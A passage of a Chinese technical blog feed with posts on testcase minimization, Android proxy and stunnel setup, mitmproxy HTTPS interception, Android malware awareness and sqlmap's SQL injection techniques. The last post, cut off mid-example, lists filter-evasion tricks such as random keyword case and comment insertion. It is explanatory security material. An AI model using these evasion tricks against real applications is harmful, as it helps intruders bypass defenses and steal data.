class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>运行后的输出，大致如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">root@fuzzing-5:/mnt/disk/halfempty# ./halfempty  ./test.sh  crash.upx <br>╭│   │ ── halfempty ───────────────────────────────────────────────── v0.30 ──<br>╰│ 16│ A fast, parallel testcase minimization<span class="hljs-built_in"> tool</span><br><span class="hljs-built_in"></span> ╰───╯ ───────────────────────────────────────────────────────── by @taviso ──<br><br>Input file <span class="hljs-string">&quot;crash.upx&quot;</span> is now 19088 bytes, starting strategy <span class="hljs-string">&quot;bisect&quot;</span><span class="hljs-built_in">..</span>.<br>Verifying the original input executes successfully<span class="hljs-built_in">..</span>. (skip with --noverify)<br>The original input file succeeded after 0.0 seconds.<br>New finalized size: 19088 (<span class="hljs-attribute">depth</span>=2) <span class="hljs-attribute">real</span>=0.0s, <span class="hljs-attribute">user</span>=0.0s, <span class="hljs-attribute">speedup</span>=~-0.0s<br><span class="hljs-attribute">treesize</span>=6654, <span class="hljs-attribute">height</span>=6376, <span class="hljs-attribute">unproc</span>=0, <span class="hljs-attribute">real</span>=4.4^C <span class="hljs-attribute">user</span>=19.3s, <span class="hljs-attribute">speedup</span>=~14.9s<br></code></pre></td></tr></table></figure><p>已经可以正常运行了。如果执行过程中遇上长时间的卡顿，需要使用 <code>--timeout</code> 参数设置超时时间。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq">./halfempty --help-all | <span class="hljs-type">grep</span> <span class="hljs-built_in">timeout</span><br>  -T, --<span class="hljs-built_in">timeout</span>=seconds                   Maximum child execution <span class="hljs-built_in">time</span> (default=unlimited).<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在 Android 手机上的使用 stunnel  （不需要 root ）</title>
    <link href="/cn/android_stunnel/"/>
    <url>/cn/android_stunnel/</url>
    
    <content type="html"><![CDATA[<h2 id="☆-Android-stunnel"><a href="#☆-Android-stunnel" class="headerlink" title="☆ Android stunnel"></a>☆ Android stunnel</h2><p><a href="https://github.com/comp500/SSLSocks.git">https://github.com/comp500/SSLSocks.git</a>  这个项目可以使用 android 版本的 stunnel, 其实就是调用 <a href="https://www.stunnel.org/downloads/stunnel-5.57-android.zip">https://www.stunnel.org/downloads/stunnel-5.57-android.zip</a></p><p>具体配置和使用命令行差距不大，参考：<br><a href="https://github.com/comp500/SSLSocks/blob/master/README.md">https://github.com/comp500/SSLSocks/blob/master/README.md</a><br><a href="https://hamy.io/post/0011/how-to-run-stunnel-on-your-android-device/">https://hamy.io/post/0011/how-to-run-stunnel-on-your-android-device/</a></p><h2 id="☆-设置全局代理"><a href="#☆-设置全局代理" class="headerlink" title="☆ 设置全局代理"></a>☆ 设置全局代理</h2><ol><li>在 wifi 连接的情况</li></ol><p>打开wifi 列表 -&gt; 长按连接的 wifi  -&gt; 点击修改 -&gt; 高级选项 -&gt; 填写代理相关信息</p><ol start="2"><li>使用 adb shell 执行命令</li></ol><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">adb</span> shell settings put global http_proxy <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.xx.xxx:<span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><ol start="3"><li>Android Proxy Toggle</li></ol><p><a href="https://github.com/theappbusiness/android-proxy-toggle.git">https://github.com/theappbusiness/android-proxy-toggle.git</a></p><p>要正常使用 app 需要用 adb shell 连接上设置相应的权限：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell pm grant com<span class="hljs-selector-class">.kinandcarta</span><span class="hljs-selector-class">.create</span><span class="hljs-selector-class">.proxytoggle</span> android<span class="hljs-selector-class">.permission</span>.WRITE_SECURE_SETTINGS<br></code></pre></td></tr></table></figure><p>OnePlus 7T 升级到 Android 12 后，执行上面的命令将出错:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">OnePlus7T:/ $ pm grant com<span class="hljs-selector-class">.kinandcarta</span><span class="hljs-selector-class">.create</span><span class="hljs-selector-class">.proxytoggle</span> android<span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.WRITE_SECURE_SETTINGS</span><br><br>Exception occurred while executing <span class="hljs-string">&#x27;grant&#x27;</span>:<br>java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.SecurityException</span>: grantRuntimePermission: Neither user <span class="hljs-number">2000</span> nor current process has android<span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.GRANT_RUNTIME_PERMISSIONS</span>.<br>        at android<span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.ContextImpl</span><span class="hljs-selector-class">.enforce</span>(ContextImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2187</span>)<br>        at android<span class="hljs-selector-class">.app</span><span class="hljs-selector-class">.ContextImpl</span><span class="hljs-selector-class">.enforceCallingOrSelfPermission</span>(ContextImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2215</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.PermissionManagerService</span><span class="hljs-selector-class">.grantRuntimePermissionInternal</span>(PermissionManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1477</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.PermissionManagerService</span><span class="hljs-selector-class">.grantRuntimePermission</span>(PermissionManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1459</span>)<br>        at android<span class="hljs-selector-class">.permission</span><span class="hljs-selector-class">.PermissionManager</span><span class="hljs-selector-class">.grantRuntimePermission</span>(PermissionManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">378</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerShellCommand</span><span class="hljs-selector-class">.runGrantRevokePermission</span>(PackageManagerShellCommand<span class="hljs-selector-class">.java</span>:<span class="hljs-number">2419</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerShellCommand</span><span class="hljs-selector-class">.onCommand</span>(PackageManagerShellCommand<span class="hljs-selector-class">.java</span>:<span class="hljs-number">260</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.modules</span><span class="hljs-selector-class">.utils</span><span class="hljs-selector-class">.BasicShellCommandHandler</span><span class="hljs-selector-class">.exec</span>(BasicShellCommandHandler<span class="hljs-selector-class">.java</span>:<span class="hljs-number">97</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.ShellCommand</span><span class="hljs-selector-class">.exec</span>(ShellCommand<span class="hljs-selector-class">.java</span>:<span class="hljs-number">38</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerService</span><span class="hljs-selector-class">.onShellCommand</span>(PackageManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">25948</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.shellCommand</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">970</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.onTransact</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">854</span>)<br>        at android<span class="hljs-selector-class">.content</span><span class="hljs-selector-class">.pm</span>.IPackageManager<span class="hljs-variable">$Stub</span><span class="hljs-selector-class">.onTransact</span>(IPackageManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">4818</span>)<br>        at com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.pm</span><span class="hljs-selector-class">.PackageManagerService</span><span class="hljs-selector-class">.onTransact</span>(PackageManagerService<span class="hljs-selector-class">.java</span>:<span class="hljs-number">8987</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.execTransactInternal</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1226</span>)<br>        at android<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.Binder</span><span class="hljs-selector-class">.execTransact</span>(Binder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">1163</span>)<br></code></pre></td></tr></table></figure><p>少数派的文章 <a href="https://sspai.com/post/67110">在 ColorOS 上免 root 玩机，请先打开这个开关</a> 中指出需要在开发者选项中<br>开启 <code>禁止权限监控</code>。</p><p>开启后可以正常执行 <code>pm grant</code> 命令，执行成功后可以使用 <code>dumpsys package &lt;package name&gt;</code> 列出所有的权限。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">dumpsys <span class="hljs-keyword">package</span> <span class="hljs-title">com.kinandcarta.create.proxytoggle | grep perm</span>ission<br><br>    requested permissions:<br>      android.permission.WRITE_SECURE_SETTINGS<br>      android.permission.WRITE_SETTINGS<br>    install permissions:<br>      android.permission.WRITE_SECURE_SETTINGS: granted=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="恢复无代理"><a href="#恢复无代理" class="headerlink" title="恢复无代理"></a>恢复无代理</h2><p>如果遇上一些异常情况，比如错误卸载了 Android Proxy Toggle, 可以使用下面命令去掉 Android 全局代理。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">adb shell settings delete global http_proxy<br>adb shell settings delete global global_http_proxy_host<br>adb shell settings delete global global_http_proxy_port<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mitmproxy 简介</title>
    <link href="/cn/mitmproxy/"/>
    <url>/cn/mitmproxy/</url>
    
    <content type="html"><![CDATA[<p>主要特色：Intercept HTTP &amp; HTTPS requests and responses and modify them on the fly</p><p>使用python编写，可以在windows，Linux， Mac 下运行，这点比 fiddler 有优势。可以修改报文内容，这点很不错。</p><ul><li>官方网站： <a href="https://www.mitmproxy.org/">https://www.mitmproxy.org/</a></li><li>文档：<a href="https://docs.mitmproxy.org/stable/">https://docs.mitmproxy.org/stable/</a></li></ul><h2 id="☆-1-安装"><a href="#☆-1-安装" class="headerlink" title="☆ 1. 安装"></a>☆ 1. 安装</h2><p>参考 <a href="https://docs.mitmproxy.org/stable/overview-installation/">https://docs.mitmproxy.org/stable/overview-installation/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo dnf install -y python-pip python-devel libffi-devel openssl-devel libxml2-devel libxslt-devel libpng-devel libjpeg-devel<br>sudo pip install mitmproxy  <span class="hljs-comment"># or pip install --user mitmproxy</span><br></code></pre></td></tr></table></figure><h2 id="☆-2-基本使用"><a href="#☆-2-基本使用" class="headerlink" title="☆ 2. 基本使用"></a>☆ 2. 基本使用</h2><p><code>mitmproxy --listen-host 127.0.0.1 -p 8080</code></p><ul><li><code>--listen-host</code> address to bind address</li><li>-p bind port</li><li>-s “script.py –bar”, –script “script.py –bar”  Run a script. Surround with quotes to pass script</li></ul><h3 id="2-1-mitmproxy-界面操作"><a href="#2-1-mitmproxy-界面操作" class="headerlink" title="2.1 mitmproxy 界面操作"></a>2.1 mitmproxy 界面操作</h3><pre><code class="hljs">- ？            显示帮助信息- h, j, k, l    上下左右，同 vi- enter         进入具体报文- q             退出界面- tab           详细报文内容页面- E             导出报文内容</code></pre><h2 id="☆-3-导入mitmproxy的-CA"><a href="#☆-3-导入mitmproxy的-CA" class="headerlink" title="☆ 3. 导入mitmproxy的 CA"></a>☆ 3. 导入mitmproxy的 CA</h2><p>使用mitmproxy 最大的原因就是因为它可以对付https报文。<br>参考 <a href="https://docs.mitmproxy.org/stable/concepts-certificates/">https://docs.mitmproxy.org/stable/concepts-certificates/</a></p><p>mitmproxy 的 CA 证书放在 ~&#x2F;.mitmproxy 目录， 可以在不同设备中添加。</p><h3 id="3-1-目标设备为Linux"><a href="#3-1-目标设备为Linux" class="headerlink" title="3.1 目标设备为Linux"></a>3.1 目标设备为Linux</h3><h4 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h4><ul><li>Google Chrome</li></ul><p>设置 -&gt; HTTPS&#x2F;SSL -&gt; 证书管理 -&gt; 授权中心</p><ul><li>Firefox</li></ul><p>没用Firefox，估计也类似。</p><h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p>设置好CA后，设置浏览器使用mitmproxy代理即可，可以考虑使用浏览器代理插件。</p><h3 id="3-2-目标设备为-Android"><a href="#3-2-目标设备为-Android" class="headerlink" title="3.2 目标设备为 Android"></a>3.2 目标设备为 Android</h3><h4 id="导入证书-1"><a href="#导入证书-1" class="headerlink" title="导入证书"></a>导入证书</h4><p>adb push ~&#x2F;.mitmproxy&#x2F;mitmproxy-ca-cert.cer &#x2F;sdcard&#x2F;Download</p><p>设置 -&gt;  安全 -&gt; 证书存储 -&gt; 从手机存储安装， 选择上传的CA证书。</p><h4 id="设置代理-1"><a href="#设置代理-1" class="headerlink" title="设置代理"></a>设置代理</h4><p>emulator 上可以通过下面的命令行，设置代理。</p><p>.&#x2F;emulator -avd 7.0_x86 -http-proxy <a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p><p>真实的设备上，可以通过设置 wifi 代理，或者使用下面的命令行。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> settings <span class="hljs-keyword">put</span> <span class="hljs-keyword">global</span> http_proxy <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8888</span><br>adb <span class="hljs-built_in">reverse</span> tcp:<span class="hljs-number">8888</span> tcp:<span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure><p>在 Android 上设置 http 全局代理 127.0.0.1:8888， 最后将 Android 的 8888 端口转发到本机 8080 端口。</p><h2 id="☆-4-透明模式"><a href="#☆-4-透明模式" class="headerlink" title="☆ 4. 透明模式"></a>☆ 4. 透明模式</h2><p>mitmproxy 支持透明部署，具体的方法可以参考下面的文章。</p><p><a href="https://docs.mitmproxy.org/stable/howto-transparent/">https://docs.mitmproxy.org/stable/howto-transparent/</a></p><h2 id="☆-5-修改报文内容"><a href="#☆-5-修改报文内容" class="headerlink" title="☆ 5. 修改报文内容"></a>☆ 5. 修改报文内容</h2><p>github 上有很多例子，这次没有需求，可以参考</p><p><a href="https://github.com/mitmproxy/mitmproxy/tree/main/examples/addons">https://github.com/mitmproxy/mitmproxy/tree/main/examples/addons</a><br><a href="https://github.com/mitmproxy/mitmproxy/tree/main/examples/contrib">https://github.com/mitmproxy/mitmproxy/tree/main/examples/contrib</a></p><p>官方文档上给了个简单例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">response</span>(<span class="hljs-params">flow</span>):<br>    flow.response.headers[<span class="hljs-string">&quot;newheader&quot;</span>] = <span class="hljs-string">&quot;foo&quot;</span><br></code></pre></td></tr></table></figure><p>给http响应报文的头部添加一个 newheader 的字段。</p><h2 id="☆-6-socks-模式"><a href="#☆-6-socks-模式" class="headerlink" title="☆ 6. socks 模式"></a>☆ 6. socks 模式</h2><p>mitmproxy -m socks5</p><p>作为 SOCKS5 proxy server 使用</p><h2 id="☆-7-总结"><a href="#☆-7-总结" class="headerlink" title="☆ 7. 总结"></a>☆ 7. 总结</h2><p>这里说到的内容非常少，mitmproxy这个工具还是很强大的。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.usmacd.com/2021/09/01/Android_SSL_Pinning/">https://www.usmacd.com/2021/09/01/Android_SSL_Pinning/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于恶意 Android 软件的那些事</title>
    <link href="/cn/android_malware/"/>
    <url>/cn/android_malware/</url>
    
    <content type="html"><![CDATA[<p>  近年来，Android手机平台上的恶意App呈不断上升的趋势，根据G DATA的数据仅2015年 第一季度发现了440267 种新的安卓恶意软件，也就是说，全球范围内每18秒就有一个新的恶意软件被发现。而天朝由于Google被封的原因，更是使恶意软件的传播更加猖獗。Google Play store 为了保证Android用户的安全做了大量的努力，和国内的一些第三方应用市场相比安全一些的。</p><p>   重打包是Android App主流的传播方式之一，和以前单独的恶意App不同，重打包的软件 在合法正常的App中插入恶意代码，迷惑性极强，一般用户觉察不出什么不同。而重打包选取 的App也大多是非常流行的App，如愤怒的小鸟之类,这些都在地下市场隐秘的进行着。重打包 App然后上传第三方App应用市场，第三方市场把关不严格的话，这些插入了恶意代码的App 就可以下载安装了。</p><p>  除了重打包软件，彩信也是Android 恶意App传播的主要方式，和以前QQ的消息尾巴类似发一些奇怪的话，后面加上短链接。短链接就是经过压缩的链接，没法一些看出原始的链接，点击后会自动下载恶意App。臭名昭著的“相册”就是通过这种方式传播，短信的内容是：小明，你还记得这些照片吗?  t.cn&#x2F;xyz1 注意这里的名字小明是正确的，相册偷取了大量的手机通讯录，按照通讯录的名字来发送，迷惑性大大增强了。</p><p>   还有值得大家注意的是，一定要警惕申请设备管理员权限的App，设备管理员可以做很多高权限的事，比如修改设备密码，擦掉数据等操作，Android手机的勒索软件就是修改了设备的密码，禁止手机主人进入手机，而进行勒索的，最近这类软件的数目增加很快，大家一定要注意。</p><p>  上面说了很多Android恶意软件相关的内容，也给大家一些安全建议,提高了安全意识也就不容易中招了。</p><ol><li>尽量在Google play 或者官方网站下载APP，不要第三方应用市场随意下载</li><li>不要随意点击不明链接</li><li>对于申请设备管理员的App，保持高度警惕</li></ol><p>  最后教大家一招急救，许多Android手机也有安全模式，安全模式只加载出厂应用，进入了安全模式，删除恶意软件，可能可以挽救你的手机 :)</p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Google Chrome 浏览器 Adobe Flash Player 升级</title>
    <link href="/cn/chrome_flash_update/"/>
    <url>/cn/chrome_flash_update/</url>
    
    <content type="html"><![CDATA[<p>某一天突然发现网页中flash已经不能正常显示了（我一般都禁用），显示 out of data 错误。</p><p>访问 chrome:&#x2F;&#x2F;components&#x2F; 可以升级 Adobe Flash Player</p><p>Adobe Flash Player - 检查更新， 失败。这里有一个坑，插件中的代理设置是无法影响<br>chrome 内部程序的，必须设置环境变量或者直接使用命令行来设置全局代理。</p><p>google-chrome —proxy-server&#x3D;”socks:&#x2F;&#x2F;127.0.0.1:9999”</p><p>重新检查更新，可以成功更新了，重启后生效了，已经不报 out of data 错误了。为了保险<br>把系统中flash player也给升级，打开网页 <a href="https://get.adobe.com/flashplayer/otherversions/">https://get.adobe.com/flashplayer/otherversions/</a></p><p>step 1 选Linux (64 bit), step 2 选 yum，下载后安装，后续可以使用dnf 升级了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap 中的 SQL Injection 检测技术</title>
    <link href="/cn/sqlmap_sql_injection/"/>
    <url>/cn/sqlmap_sql_injection/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/henices/sqli">https://github.com/henices/sqli</a><br><a href="https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OWASP-DV-005)</a></p><h2 id="基于信道的-sql-injection-分类"><a href="#基于信道的-sql-injection-分类" class="headerlink" title="基于信道的 sql injection 分类"></a>基于信道的 sql injection 分类</h2><h3 id="Inband"><a href="#Inband" class="headerlink" title="Inband"></a>Inband</h3><p>SQL代码注入和SQL injection 结果的获取在同一频道(e.g. 浏览器), 获得的数据直接显示在应用程序页面的正常输出或者错误信息中,这是最简单的攻击类型。</p><h3 id="Out-of-band"><a href="#Out-of-band" class="headerlink" title="Out-of-band"></a>Out-of-band</h3><p>SQL查询数据的传输使用不同的频道(e.g HTTP，DNS)， 这是从数据库中获取大量数据简单的方法。</p><h3 id="Inferential"><a href="#Inferential" class="headerlink" title="Inferential"></a>Inferential</h3><p>没用真实有用的数据传输，但是攻击者可以通过发送特定的请求，观察数据库服务器的返回的结果的行为重建信息。</p><h2 id="基于-sql-inject-检测技术的分类"><a href="#基于-sql-inject-检测技术的分类" class="headerlink" title="基于 sql inject 检测技术的分类"></a>基于 sql inject 检测技术的分类</h2><h3 id="boolean-based-blind-SQL-injection"><a href="#boolean-based-blind-SQL-injection" class="headerlink" title="boolean-based blind SQL injection"></a>boolean-based blind SQL injection</h3><p>也被称为推理SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，一个有效的SQL语句字符串包含 SELECT 子语句，或任何其他用户要检索输出的SQL语句。对于每个HTTP响应，将其 headers&#x2F;body和原始请求的做比较，该工具一个字符一个字符地分析的注入语句的输出。另外，用户可以提供一个字符串或正则表达式匹配正确的页面。使用SqlMap实现的二分算法来实施执行此技术可以获取七个最大的每个HTTP请求的输出的每一个字符。凡不属于输出纯文本纯字符集，SqlMap将适应与更大范围的算法来检测输出。</p><h3 id="error-based-SQL-injection"><a href="#error-based-SQL-injection" class="headerlink" title="error-based SQL injection"></a>error-based SQL injection</h3><p>sqlmap替换或者追加受影响的HTTP参数一个特定数据的语法错误的SQL语句，分析HTTP 响应header和body，查询DBMS错误信息中是否包含注入的预先定义的字符串链，并且SQL语句的输出在字符串链的中间.这种技术仅在web应用程序被配置成泄漏后端数据库管理系统错误信息时有效。</p><h3 id="time-based-blind-or-stacked-queries"><a href="#time-based-blind-or-stacked-queries" class="headerlink" title="time-based blind or stacked queries"></a>time-based blind or stacked queries</h3><p>也被称为全盲SQL注入：SqlMap替换或追加HTTP请求中受影响的参数，构造一个有效的SQL语句字符串包含一个查询，使后端DBMS sleep几秒钟。对于每个HTTP响应，比较其响应时间与原始请求的HTTP响应时间，该工具一个字符一个字符地分析的注入语句的输出。和boolean-based技术一样，同样应用了二分算法(bisection algorithm)。</p><h3 id="UNION-query-SQL-injection"><a href="#UNION-query-SQL-injection" class="headerlink" title="UNION query SQL injection"></a>UNION query SQL injection</h3><p>SqlMap 追加受影响的参数一个以UNION ALL SELECT开始的有效的SQL语句字符串。这种技术当Web应用程序页面内将SELECT语句的同一周期输出，或者类似的，网页上的内容中显示查询结果的每一行时有效。SqlMap是还可以利用部分UNION 查询的SQL注入漏洞，当SQL语句的输出不是在一个周期内的，在构造的区域内只有在查询输出的第一项被显示。</p><h3 id="Stacked-queries-SQL-injection"><a href="#Stacked-queries-SQL-injection" class="headerlink" title="Stacked queries SQL injection"></a>Stacked queries SQL injection</h3><p>也被称为多语句SQL注入（multiple statements SQL injection）：SqlMap 测试 Web 应用程序是否支持批量叠查询, 然后，它支持的情况下，它附加到HTTP请求中受影响的参数，一个分号（;） 随后的SQL语句会被执行。这种技术在执行 SELECT以外的SQL语句时非常有用，根据后端数据库管理系统的不同用户和会话特权,数据定义和数据操作SQL语句可能导致文件系统的读写访问和操作系统命令执行的。</p><h2 id="SQL-Injection-检测的逃逸技术"><a href="#SQL-Injection-检测的逃逸技术" class="headerlink" title="SQL Injection 检测的逃逸技术"></a>SQL Injection 检测的逃逸技术</h2><h3 id="随机大小写"><a href="#随机大小写" class="headerlink" title="随机大小写"></a>随机大小写</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">INSERT</span> <span class="hljs-operator">=</span>&gt; InsERt<br></code></pre></td></tr></table></figure><p>支持的数据库类型：</p><table><thead><tr><th>数据库</th><th>是否支持</th></tr></thead><tbody><tr><td>MSSQL</td><td>支持</td></tr><tr><td>MySQL</td><td>支持</td></tr><tr><td>PostgreSQL</td><td>支持</td></tr><tr><td>Oracle</td><td>支持</td></tr></tbody></table><h3 id="空格用注释替换"><a href="#空格用注释替换" class="headerlink" title="空格用注释替换"></a>空格用注释替换</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id <span class="hljs-keyword">FROM</span> users <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>id<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>users<br></code></pre></td></tr></table></figure><p>支持的数据库类型：</p><table><thead><tr><th>数据库</th><th>是否支持</th></tr></thead><tbody><tr><td>MSSQL</td><td>支持</td></tr><tr><td>MySQL</td><td>支持</td></tr><tr><td>PostgreSQL</td><td>支持</td></tr><tr><td>Oracle</td><td>支持</td></tr><tr><td>Access</td><td>不支持</td></tr></tbody></table><p>Oracle 10g 测试</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-operator">*</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span> v$version;<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">BANNER</span><br><span class="hljs-section">----------------------------------------------------------------</span><br>Oracle Database 10g Enterprise Edition Release 10.1.0.3.0 - Prod<br>PL/SQL Release 10.1.0.3.0 - Production<br>CORE10.1.0.3.0Production<br>TNS for Linux: Version 10.1.0.3.0 - Production<br>NLSRTL Version 10.1.0.3.0 - Production<br></code></pre></td></tr></table></figure><p>PostgreSQL:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">postgres<span class="hljs-operator">=</span># <span class="hljs-keyword">select</span><span class="hljs-comment">/*abc*/</span>version();<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">                                                               version                                                                </span><br><span class="hljs-section">--------------------------------------------------------------------------------------------------------------------</span><br><span class="hljs-code"> PostgreSQL 8.1.4 on i686-pc-linux-gnu, compiled by GCC i686-pc-linux-gnu-gcc (GCC) 3.4.6 (Gentoo 3.4.6-r1, ssp-3.4.5-1.0, pie-8.7.9)</span><br></code></pre></td></tr></table></figure><h3 id="随机注释"><a href="#随机注释" class="headerlink" title="随机注释"></a>随机注释</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">IN</span><span class="hljs-comment">/**/</span>S<span class="hljs-comment">/**/</span>ERT<br></code></pre></td></tr></table></figure><p>本身语法不支持，但可以对付不正确的过滤.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">postgres<span class="hljs-operator">=</span># selec<span class="hljs-comment">/**/</span>t version();<br></code></pre></td></tr></table></figure><p>ERROR:  syntax error at or near “selec” 在字符 1<br>第 1 行: selec&#x2F;**&#x2F;t version();</p><p>Oracle:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SQL</span><span class="hljs-operator">&gt;</span> sel<span 